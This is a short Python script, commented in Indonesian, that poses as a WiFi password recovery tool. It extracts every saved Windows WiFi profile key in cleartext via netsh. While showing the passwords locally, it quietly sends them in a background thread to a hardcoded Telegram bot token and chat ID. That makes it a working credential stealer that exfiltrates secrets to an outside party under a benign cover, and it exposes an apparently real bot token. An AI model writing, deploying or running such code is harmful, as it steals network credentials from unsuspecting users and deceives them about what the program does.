import subprocess
import telepot
import threading


# Mendapatkan daftar profil WiFi dan password
def get_wifi_passwords():
    print("Loading password...")
    meta_data = subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    data = meta_data.decode("utf-8", errors="backslashreplace")
    data = data.split("\n")
    profiles = []
    for i in data:
        if "All User Profile" in i:
            i = i.split(":")
            i = i[1][1:-1].strip()
            profiles.append(i)

    wifi_passwords = {}
    for profile in profiles:
        try:
            results = subprocess.check_output(
                ["netsh", "wlan", "show", "profile", profile, "key=clear"]
            )
            results = results.decode("utf-8", errors="backslashreplace")
            results = results.split("\n")

            # Cek apakah ada data "Key Content" dalam hasil
            password_data = [
                b.split(":")[1][1:-1].strip() for b in results if "Key Content" in b
            ]

            # Pastikan ada data "Key Content" sebelum mencoba mengakses indeks 0
            if password_data:
                password = password_data[0]
            else:
                password = "Password not found!"

            wifi_passwords[profile] = password
        except subprocess.CalledProcessError:
            wifi_passwords[profile] = "Password not found!"

    return wifi_passwords


# Kirim pesan ke Telegram di latar belakang
def send_telegram_message(bot_token, chat_id, message):
    bot = telepot.Bot(bot_token)
    bot.sendMessage(chat_id, message)


# Mendapatkan daftar WiFi passwords
wifi_passwords = get_wifi_passwords()

# Format pesan untuk Telegram
telegram_message = "\n".join(
    [
        f"WiFi Network: {network}\nPassword: {password}\n"
        for network, password in wifi_passwords.items()
    ]
)

# Token API bot Telegram Anda
bot_token = "6679588494:AAGt5ePJfAT3o5U-0OCEYfw3xnk49nd4Vdc"

# ID obrolan (chat ID) di Telegram di mana Anda ingin mengirim pesan
chat_id = "1556715660"

# Menggunakan threading untuk mengirim pesan di latar belakang
thread = threading.Thread(
    target=send_telegram_message, args=(bot_token, chat_id, telegram_message)
)
thread.start()

print("\nSaved WiFi Passwords:")
for network, password in wifi_passwords.items():
    print(f"Network: {network}\nPassword: {password}\n")

input("Success recovering all WiFi Password! Press Enter to exit...")
